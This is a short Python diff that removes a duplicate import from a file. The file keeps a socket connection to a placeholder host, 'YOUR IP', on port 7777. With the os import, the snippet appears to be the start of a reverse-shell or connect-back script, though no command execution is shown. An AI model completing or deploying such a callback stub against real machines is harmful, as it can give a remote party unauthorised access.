@@ -1,8 +1,6 @@
 import os
 import socket
 
-import socket
-
 sock = socket.socket()
 sock.connect(('YOUR IP', 7777))
 
